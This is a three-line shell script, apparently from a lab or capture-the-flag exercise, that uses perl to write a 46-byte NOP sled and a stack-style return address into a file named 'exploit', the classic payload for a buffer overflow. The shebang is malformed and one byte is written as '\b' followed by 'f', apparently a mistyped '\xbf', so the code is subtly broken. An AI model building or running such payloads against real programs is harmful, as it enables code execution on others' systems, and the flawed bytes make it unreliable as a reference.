#/bin/bash

perl -e 'print "\x90"x46' >> exploit
perl -e 'print "\x40\xf6\xff\bf"' >> exploit